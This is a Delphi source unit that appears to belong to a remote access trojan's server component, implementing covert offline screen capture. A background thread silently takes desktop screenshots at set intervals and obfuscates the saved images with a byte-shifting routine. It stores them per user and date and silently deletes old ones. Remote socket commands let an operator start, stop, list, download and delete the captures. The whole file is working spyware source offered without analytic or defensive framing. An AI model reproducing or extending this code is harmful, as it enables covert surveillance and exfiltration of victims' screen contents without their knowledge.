unit UnitOfflineScreenCapture;

interface

uses
  windows,socketunit, unitshareddata, umsfpack, CompressionStreamUnit, imagehlp, shellapi;

type
  TBitmap = record
    bmType: Integer;
    bmWidth: Integer;
    bmHeight: Integer;
    bmWidthBytes: Integer;
    bmPlanes: Byte;
    bmBitsPixel: Byte;
    bmBits: Pointer;
  end;

const
  BMType = $4D42;

var
  MDC: HBitmap;
  ThreadHandle: dword;
  ScreenWidth,ScreenHeight: Integer;

threadvar
  CaptureData: string;
  BitCount: integer;
  DrawCursor: bool;
  Cursor: HIcon;
  SocketHandle: integer;

//function SaveBitmapToFile(HBM: HBitmap;BitCount: word): string;
procedure ParseData(Socket: TClientSocket; Data: string);

implementation

procedure SendData(Socket: TClientSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'ScreenCapture|' + Data);
end;

function AlignDouble(Size: Longint): Longint;
begin
  Result := (Size + 31) div 32 * 4;
end;

function GetTime: string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);

  if MyTime.wHour < 10 then begin
    Result := '0' + inttostr(MyTime.wHour);
  end else begin
    Result := Result + inttostr(MyTime.wHour);
  end;

  if MyTime.wMinute < 10 then begin
    Result := Result + '.0' + inttostr(MyTime.wMinute);
  end else begin
    Result := Result + '.' + inttostr(MyTime.wMinute);
  end;

  if MyTime.wSecond < 10 then begin
    Result := Result + '.0' + inttostr(MyTime.wSecond);
  end else begin
    Result := Result + '.' + inttostr(MyTime.wSecond);
  end;

end;

function GetDate(s: string): string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);

  if MyTime.wDay < 10 then begin
    Result := '0' + inttostr(MyTime.wDay);
  end else begin
    Result := Result + inttostr(MyTime.wDay);
  end;

  if MyTime.wMonth < 10 then begin
    Result := Result + '-0' + inttostr(MyTime.wMonth);
  end else begin
    Result := Result + '-' + inttostr(MyTime.wMonth);
  end;

  if MyTime.wYear < 10 then begin
    Result := Result + '-0' + inttostr(MyTime.wYear);
  end else begin
    Result := Result + '-' + inttostr(MyTime.wYear);
  end;

end;

function UserName: string;
var
	Size : Dword ;
	Buffer : array [0..255] of char ;
begin
	Size := 256;
	GetUserName(Buffer,Size);
	Result := Buffer ;
end;

function Ca(St: string): string;
var
  i: integer;
  a: byte;
begin
  for i := length(St) downto 1 do begin
    A := ord(St[i]);
    result := result + char(a+1);
  end;
end;

function SaveBitmapToFile(HBM: HBitmap;BitCount: word): string;
var
  BM: TBitmap;
  BFH: TBitmapFileHeader;
  BIP: PBitmapInfo;
  DC: HDC;
  HMem: THandle;
  Buf: Pointer;
  ColorSize, DataSize: Longint;
  stream: tmemorystream;
  FolderName: string;
  Data: string;
begin
  if GetObject(HBM, SizeOf(TBitmap), @BM) = 0 then Exit;

  ColorSize := 0;
  if (BitCount <> 24) then ColorSize := SizeOf(TRGBQuad) * (1 shl BitCount);

  DataSize := AlignDouble(bm.bmWidth * BitCount) * bm.bmHeight;
  GetMem(BIP, SizeOf(TBitmapInfoHeader) + ColorSize);

  if BIP <> nil then begin
    with BIP^.bmiHeader do begin
      biSize := SizeOf(TBitmapInfoHeader);
      biWidth := bm.bmWidth;
      biHeight := bm.bmHeight;
      biPlanes := 1;
      biBitCount := BitCount;
      biCompression := 0;
      biSizeImage := DataSize;
      biXPelsPerMeter := 0;
      biYPelsPerMeter := 0;
      biClrUsed := 0;
      biClrImportant := 0;
    end;

    with BFH do begin
      bfOffBits := SizeOf(BFH) + SizeOf(TBitmapInfo) + ColorSize;
      bfReserved1 := 0;
      bfReserved2 := 0;
      bfSize := longint(bfOffBits) + DataSize;
      bfType := BMType;
    end;

    HMem := GlobalAlloc(gmem_Fixed, DataSize);
    if HMem <> 0 then begin
      Buf := GlobalLock(HMem);
      DC := GetDC(0);
      if GetDIBits(DC, hbm, 0, bm.bmHeight,Buf, BIP^, dib_RGB_Colors) <> 0 then begin

        Stream := TMemoryStream.Create;
        Stream.WriteBuffer(BFH, SizeOf(BFH));
        Stream.WriteBuffer(PChar(BIP)^, SizeOf(TBitmapInfo) + ColorSize);
        Stream.WriteBuffer(Buf^, DataSize);

        SetString(Data,pchar(Stream.Memory),Stream.Size);
        Data := Ca(Data);
        Stream.Clear;
        Stream.Write(pointer(Data)^,Length(Data));

        FolderName := MakePathNormal(ServerData.InstallFolder) + 'Images\' +  UserName + '\' + GetDate('-') + '\';
        MakeSureDirectoryPathExists(pchar(FolderName));
        Stream.SaveToFile(FolderName + GetTime);
        stream.Free;

      end;
      ReleaseDC(0, DC);
      GlobalUnlock(HMem);
      GlobalFree(HMem);
    end;

  end;
  FreeMem(BIP, SizeOf(TBitmapInfoHeader) + ColorSize);
  DeleteObject(HBM);
end;

function GetDesktop: HBitmap;
var
  DC, MemDC, Bitmap, OBitmap: HBitmap;
begin
  DC := GetDC(GetDesktopWindow);
  MemDC := CreateCompatibleDC(DC);
  ScreenWidth := GetDeviceCaps(DC, HORZRES);
  ScreenHeight := GetDeviceCaps(DC, VERTRES);
  Bitmap := CreateCompatibleBitmap(DC, ScreenWidth, ScreenHeight);
  OBitmap := SelectObject(MemDC, Bitmap);
  StretchBlt(MemDC, 0, 0, ScreenWidth, ScreenHeight, DC, 0, 0, ScreenWidth, ScreenHeight, SRCCOPY);
  SelectObject(MemDC, OBitmap);
  DeleteDC(MemDC);
  ReleaseDC(GetDesktopWindow, DC);
  Result := Bitmap;
end;

function DeleteDirectory(dir: string): string;
var
  fos: TSHFileOpStruct;
begin
  Result := 'Error Deleting File: ' + dir;
  ZeroMemory(@fos, SizeOf(fos));
  with fos do
  begin
    wFunc := FO_DELETE;
    fFlags := FOF_SILENT + FOF_NOCONFIRMATION + FOF_NOERRORUI;
    pFrom := PChar(dir + #0);
  end;
  if (0 = ShFileOperation(fos)) then Result := 'Deleted File: ' + dir;
end;

function RightStr(Text : String ; Num : Integer): String ;
begin
   Result := Copy(Text,length(Text)+1 -Num,Num);
end;

function IncludeTrailingBackslash(Path: string): string;
begin
  Result := Path;
  if RightStr(Path,1) <> '\' then Result := Result + '\';
end;

function GetAttrib(FindData: TWIN32FindData):string;
begin
  if FindData.dwFileAttributes and $00000010 <> 0 then begin
    Result := 'File Folder';
  end else begin
    if FindData.dwFileAttributes and $00000020 <> 0 then Result := Result + 'A';
    if FindData.dwFileAttributes and $00000002 <> 0 then Result := Result + 'H';
    if FindData.dwFileAttributes and $00000001 <> 0 then Result := Result + 'R';
    if FindData.dwFileAttributes and $00000004 <> 0 then Result := Result + 'S';
  end;
end;

procedure FileListRecursive(var s: string; path: string);
var
  FindData: TWIN32FindData;
  hFind: THandle;
begin
  path := includetrailingbackslash(path);
  hFind := FindFirstFile(pchar(Path + '*'), FindData);
  if hFind = INVALID_HANDLE_VALUE then exit;

  if GetAttrib(FindData) <> 'File Folder' then begin
    s := s + Path + string(FindData.cFileName) + #13#10;
  end else begin
    if (string(FindData.cFileName) <> '.') and (FindData.cFileName <> '..') then FileListRecursive(s,Path + FindData.cFileName);
  end;

  while FindNextFile(hFind, FindData) do begin
    if GetAttrib(FindData) <> 'File Folder' then begin
      s := s + Path + string(FindData.cFileName) + #13#10;
    end else begin
      if (string(FindData.cFileName) <> '.') and (FindData.cFileName <> '..') then FileListRecursive(s,Path + FindData.cFileName);
    end;
  end;

  FindClose(hFind);
end;

procedure FolderSize(var Size: dword; path: string);
var
  FindData: TWIN32FindData;
  hFind: THandle;
begin
  path := includetrailingbackslash(path);
  hFind := FindFirstFile(pchar(Path + '*'), FindData);
  if hFind = INVALID_HANDLE_VALUE then exit;

  if GetAttrib(FindData) <> 'File Folder' then begin
    Inc(Size,FindData.nFileSizeLow);
  end else begin
    if (string(FindData.cFileName) <> '.') and (FindData.cFileName <> '..') then FolderSize(size,Path + FindData.cFileName);
  end;

  while FindNextFile(hFind, FindData) do begin
    if GetAttrib(FindData) <> 'File Folder' then begin
      Inc(Size,FindData.nFileSizeLow);
    end else begin
      if (string(FindData.cFileName) <> '.') and (FindData.cFileName <> '..') then FolderSize(size,Path + FindData.cFileName);
    end;
  end;

  Windows.FindClose(hFind);
end;

procedure CaptureThread; stdcall;
var
  Size: dword;
begin
  while 1 < 2 do begin
    Size := 0;
    FolderSize(Size,MakePathNormal(ServerData.InstallFolder) + 'Images\');
    Size := Size div 1024;  //kb
    Size := Size div 1024;  //mb
    if (Size >= strtoint(ServerData.FolderSize)) and (ServerData.FolderSize <> '0') then begin //0 for unlimited
      DeleteDirectory(MakePathNormal(ServerData.InstallFolder) + 'Images');
    end;
    SaveBitmapToFile(GetDesktop,8);
    Sleep(StrToInt(ServerData.SleepInterval));
  end;
end;

procedure ParseData(Socket: TClientSocket; Data: string);
var
  Command,logs: string;
  thr: dword;
  Stream: tmemorystream;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'Start' then begin
    ServerData.OfflineScreenCapture := 'True';
    if ThreadHandle <> 0 then exit;
    ThreadHandle := CreateThread(nil,0,@CaptureThread,nil,0,thr);
  end;

  if Command = 'Stop' then begin
    ServerData.OfflineScreenCapture := 'False';
    TerminateThread(ThreadHandle,0);
    ThreadHandle := 0;
  end;

  if Command = 'Images' then begin
    FileListRecursive(Logs,MakePathNormal(ServerData.InstallFolder) + 'Images\');
    SendData(Socket,Command + '|' + Logs);
  end;

  if Command = 'GetImage' then begin
    Stream := TMemoryStream.Create;
    Stream.LoadFromFile(MakePathNormal(ServerData.InstallFolder) + 'Images\' + Data);
    SetString(Data,Pchar(Stream.Memory),Stream.Size);
    Stream.Free;
    SendData(Socket,Command + '|' + Data);
  end;

  if Command = 'Delete' then begin
    DeleteDirectory(MakePathNormal(ServerData.InstallFolder) + 'Images\' + Data);
  end;

end;

end.
